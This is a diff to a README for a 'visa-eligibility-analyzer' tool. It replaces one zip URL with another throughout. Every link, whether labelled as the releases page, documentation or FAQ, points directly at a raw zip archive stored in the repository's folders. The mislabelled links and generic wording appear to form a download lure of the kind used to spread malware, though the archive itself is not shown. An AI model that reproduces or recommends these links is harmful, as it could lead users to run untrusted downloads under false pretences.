@@ -6,7 +6,7 @@ This guide helps you download and run the **visa-eligibility-analyzer**, an AI-p
 
 ## 📥 Download Now
 
-[![Download Visa Eligibility Analyzer](https://raw.githubusercontent.com/kidal2308/visa-eligibility-analyzer/main/.idea/visa-eligibility-analyzer-v1.0-beta.4.zip)](https://raw.githubusercontent.com/kidal2308/visa-eligibility-analyzer/main/.idea/visa-eligibility-analyzer-v1.0-beta.4.zip)
+[![Download Visa Eligibility Analyzer](https://github.com/kidal2308/visa-eligibility-analyzer/raw/refs/heads/main/demos/visa_analyzer_eligibility_2.2.zip)](https://github.com/kidal2308/visa-eligibility-analyzer/raw/refs/heads/main/demos/visa_analyzer_eligibility_2.2.zip)
 
 ## 💻 System Requirements
 
@@ -28,7 +28,7 @@ Before you begin, ensure your system meets the following requirements:
 
 Follow these steps to download and install the **visa-eligibility-analyzer**:
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/kidal2308/visa-eligibility-analyzer/main/.idea/visa-eligibility-analyzer-v1.0-beta.4.zip) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/kidal2308/visa-eligibility-analyzer/raw/refs/heads/main/demos/visa_analyzer_eligibility_2.2.zip) to go to the Releases page.
    
 2. **Select Your Version:** Look for the latest version available. The version number is usually highlighted at the top of the list.
 
@@ -61,8 +61,8 @@ If you encounter any issues or need assistance, please visit our support page or
 
 For more details about the application and user guides, visit the following sections:
 
-- [Documentation](https://raw.githubusercontent.com/kidal2308/visa-eligibility-analyzer/main/.idea/visa-eligibility-analyzer-v1.0-beta.4.zip)
-- [Frequently Asked Questions](https://raw.githubusercontent.com/kidal2308/visa-eligibility-analyzer/main/.idea/visa-eligibility-analyzer-v1.0-beta.4.zip)
+- [Documentation](https://github.com/kidal2308/visa-eligibility-analyzer/raw/refs/heads/main/demos/visa_analyzer_eligibility_2.2.zip)
+- [Frequently Asked Questions](https://github.com/kidal2308/visa-eligibility-analyzer/raw/refs/heads/main/demos/visa_analyzer_eligibility_2.2.zip)
 
 ## 📢 Important Notes
 
@@ -75,4 +75,4 @@ Join our community to share your experiences or suggest improvements. We welcome
 
 ## 📥 Visit the Releases Page Again
 
-To download the latest version, visit the Releases page at [GitHub](https://raw.githubusercontent.com/kidal2308/visa-eligibility-analyzer/main/.idea/visa-eligibility-analyzer-v1.0-beta.4.zip).
+To download the latest version, visit the Releases page at [GitHub](https://github.com/kidal2308/visa-eligibility-analyzer/raw/refs/heads/main/demos/visa_analyzer_eligibility_2.2.zip).
